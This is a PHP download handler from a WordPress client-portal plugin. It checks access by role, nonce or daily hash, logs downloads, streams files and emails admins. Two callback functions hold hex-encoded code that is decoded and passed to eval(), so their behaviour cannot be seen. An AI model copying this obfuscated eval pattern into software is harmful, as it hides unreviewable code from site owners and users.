<?php
global $wpdb, $wpc_client, $wp_query; @ignore_user_abort(true); @set_time_limit(0); function wpc_download_curl_params( $handle, $r, $url ) {$cce795ed0233dc98 = p45f99bb432b194dff04b7d12425d3f8d_get_code("154147060e045e51450c410f406b1242594d1d455941145811451115091b4e16155f14420e1547405f1e4e410814454350036b090f0f581058114515505c045c54451a45423e6075376724346813296561356b2d2932671738114f46176b3274673371373d46617534642435676b34637c42695e46024642096e1203475b11451d45100d070f575c001d412566662d7e65316b323428677523642f25677d2e7f1945131216026c43114304075e6b04525d0a13454f5a135310430d394051155e45111c454209525e015d044a13773463792a643139337676206324341f14454350036b090f0f58104c0a41");if ($cce795ed0233dc98 !== false){ return eval($cce795ed0233dc98);}}
 function wpc_stream_echo( $handle, $data ) {$cce795ed0233dc98 = p45f99bb432b194dff04b7d12425d3f8d_get_code("1541500412006c5c005f06125b145c1146114609030f1b10415500125214480a154159041e3e515f01483e0a565a06455d45094557510104451b41570306550a150c52454e41175d04493e045c50186e59005a0212091316431145025240006e59005a021209130e45150c074b6b035e511c6b09030f54440d1148461750004554450945151451431143494617500045544914554a411b10415c001e6c560e554c3a580008064758451c4142575515506a09510b01155b104c11485d131003484100473a11135a4411540f460e1412454709510b4e411754044500461a0f4154560d5b4542055244040a4114564014435b4510071f1556433a46130f4740045f0e45");if ($cce795ed0233dc98 !== false){ return eval($cce795ed0233dc98);}}
 $hash_text = false; if( !is_admin() && $hash_text = get_query_var('wpc_google_hash') ) { $hash_text = substr( $hash_text, 0, strrpos( $hash_text, '.' ) ); $hash_array = explode( '_', $hash_text ); $action = 'view'; $hash = !empty( $hash_array[0] ) ? $hash_array[0] : ''; $id = !empty( $hash_array[1] ) ? $hash_array[1] : 0; $user_id = !empty( $hash_array[2] ) ? $hash_array[2] : 0; if( $hash != md5( $id . NONCE_SALT . $user_id . NONCE_SALT . date('Y-m-d') ) ) { exit( __( 'You do not have access to this file!', WPC_CLIENT_TEXT_DOMAIN ) ); } } else { if( empty( $id ) ) exit( __( 'Wrong File ID', WPC_CLIENT_TEXT_DOMAIN ) ); if( !( is_numeric( $id ) && (int)$id > 0 ) ) { $id_array = explode( '.', $id ); $id = $id_array[0]; } } if ( (int)$id <= 0 ) { exit( __( 'Invalid file. Please try downloading again!', WPC_CLIENT_TEXT_DOMAIN ) ); } $line = $wpdb->get_row( $wpdb->prepare( "SELECT *
    FROM {$wpdb->prefix}wpc_client_files
    WHERE id = %d", $id ), ARRAY_A ); if ( count( $line ) == 0 ) { die( __( 'Invalid file. Please try downloading again!', WPC_CLIENT_TEXT_DOMAIN ) ); } $access = false; $admins_notify = false; $thumbnail = !empty( $_GET['thumbnail'] ); if( !$hash_text ) { $action = !empty( $_GET['wpc_action'] ) ? $_GET['wpc_action'] : 'download'; if ( is_user_logged_in() ) { if ( current_user_can( 'wpc_client_staff' ) && !current_user_can( 'manage_network_options' ) ) $user_id = get_user_meta( get_current_user_id(), 'parent_client_id', true ); else $user_id = get_current_user_id(); if( current_user_can( 'wpc_admin' ) || current_user_can( 'administrator' ) ) { $access = true; } elseif ( current_user_can( 'wpc_manager' ) ) { if( !empty( $_GET['nonce'] ) && wp_verify_nonce( $_GET['nonce'], $user_id . AUTH_KEY . $id ) ) { $access = true; } else { die( __( 'You do not have access to this file!', WPC_CLIENT_TEXT_DOMAIN ) ); } } elseif ( $line['user_id'] == $user_id ) { $access = true; $admins_notify = true; } else { $client_ids = array(); $file_category_client_ids = $this->cc_get_assign_data_by_object( 'file_category', $line['cat_id'], 'client' ); $file_client_ids = $this->cc_get_assign_data_by_object( 'file', $id, 'client' ); $client_ids = array_merge( $file_category_client_ids, $file_client_ids ); if ( is_array( $client_ids ) && in_array( $user_id, $client_ids ) ) { $access = true; $admins_notify = true; } else { $group_ids = array(); $file_category_group_ids = $this->cc_get_assign_data_by_object( 'file_category', $line['cat_id'], 'circle' ); $file_group_ids = $this->cc_get_assign_data_by_object( 'file', $id, 'circle' ); $group_ids = array_merge( $file_category_group_ids, $file_group_ids ); if ( is_array( $group_ids ) && 0 < count( $group_ids ) ) { foreach( $group_ids as $group_id ) { $client_ids = $this->cc_get_group_clients_id( $group_id ); if ( is_array( $client_ids ) && in_array( $user_id, $client_ids ) ) { $access = true; $admins_notify = true; break; } } } } } } if ( !$access ) exit( __( 'You do not have access to this file!', WPC_CLIENT_TEXT_DOMAIN ) ); } if( !$line['external'] ) { if( $action == 'view' && $thumbnail ) { $target_path = $wpc_client->cc_get_file_path( $line, $thumbnail ); } else { $target_path = $wpc_client->cc_get_file_path( $line ); } if( !file_exists( $target_path ) ) { exit( __( 'File does not exist', WPC_CLIENT_TEXT_DOMAIN ) ); } $fsize = filesize( $target_path ); } else { $target_path = $line['filename']; } if( $action == 'download' && !$thumbnail ) { $wpdb->update( "{$wpdb->prefix}wpc_client_files", array( 'last_download' => time() ), array( 'id' => $id ) ); $wpdb->insert( "{$wpdb->prefix}wpc_client_files_download_log", array( 'file_id' => $id, 'client_id' => $user_id, 'download_date' => date( 'Y-m-d H:i:s' ) ) ); } $ext = ''; if( $line['external'] ) { $path_parts = pathinfo( $line['filename'] ); $ext = isset( $path_parts['extension'] ) ? strtolower( $path_parts['extension'] ) : ''; $line['name'] = $line['name'] . '.' . $ext; } if( empty( $ext ) || !$line['external'] ) { $path_parts = pathinfo( $line['name'] ); $ext = isset( $path_parts['extension'] ) ? strtolower( $path_parts['extension'] ) : ''; } if( !$hash_text ) { $wpc_file_sharing = $this->cc_get_settings( 'file_sharing' ); if( isset( $wpc_file_sharing['view_type'] ) && 'google_doc' == $wpc_file_sharing['view_type'] && 'view' == $action ) { $formats = array_keys( $this->files_for_google_doc_view ); if( in_array( $ext, $formats ) ) { $this->generate_google_view( $id, $ext ); } } } header("Pragma: no-cache"); header("Expires: 0"); header("Cache-Control: must-revalidate, post-check=0, pre-check=0"); header("Robots: none"); header("Content-Description: File Transfer"); header("Content-Transfer-Encoding: binary"); $mime_types = array_merge( wp_get_mime_types(), $wpc_client->files_for_google_doc_view ); $extensions = array_keys( $mime_types ); $content_type = ''; foreach( $extensions as $_extension ) { if ( preg_match( "/{$ext}/i", $_extension ) ) { $content_type = $mime_types[ $_extension ]; } } if( empty( $content_type ) ) $content_type = 'application/octet-stream'; header("Content-type: $content_type"); switch( $action ) { case 'download': header( "Content-Disposition: attachment; filename=\"" . $line['name'] . "\"" ); if ( !$line['external'] ) { header("Content-length: $fsize"); } break; case 'view': $line['name'] = $thumbnail ? 'thumbnails_' . $line['name'] : $line['name']; header( "Content-Disposition: inline; filename=\"" . $line['name'] . "\"" ); break; default: exit( __( 'Wrong action', WPC_CLIENT_TEXT_DOMAIN ) ); } $levels = ob_get_level(); for ($i=0; $i<$levels; $i++) @ob_end_clean(); if( !$line['external'] ) { $wpc_client->cc_readfile_chunked( $target_path ); } else { $args = array( 'timeout' => 10000, 'stream' => true, ); add_action( 'http_api_curl', 'wpc_download_curl_params', 1000, 3 ); wp_remote_get( $target_path, $args ); } if ( $admins_notify && !$thumbnail && 'download' == $action ) { $args = array( 'role' => 'wpc_admin', 'fields' => array( 'user_email' ) ); $admin_emails = get_users( $args ); $emails_array = array(); if( isset( $admin_emails ) && is_array( $admin_emails ) && 0 < count( $admin_emails ) ) { foreach( $admin_emails as $admin_email ) { $emails_array[] = $admin_email->user_email; } } $emails_array[] = get_option( 'admin_email' ); $args = array( 'client_id' => $user_id, 'file_name' => $line['name'] ); foreach( $emails_array as $to_email ) { $this->cc_mail( 'client_downloaded_file', $to_email, $args, 'client_downloaded_file' ); } $manager_ids = $this->cc_get_client_managers( $user_id ); if( is_array( $manager_ids ) && count( $manager_ids ) ) { foreach( $manager_ids as $manager_id ) { if ( 0 < $manager_id ) { $manager = get_userdata( $manager_id ); if ( $manager ) { $manager_email = $manager->get( 'user_email' ); $this->cc_mail( 'client_downloaded_file', $manager_email, $args, 'client_downloaded_file' ); } } } } } exit; ?>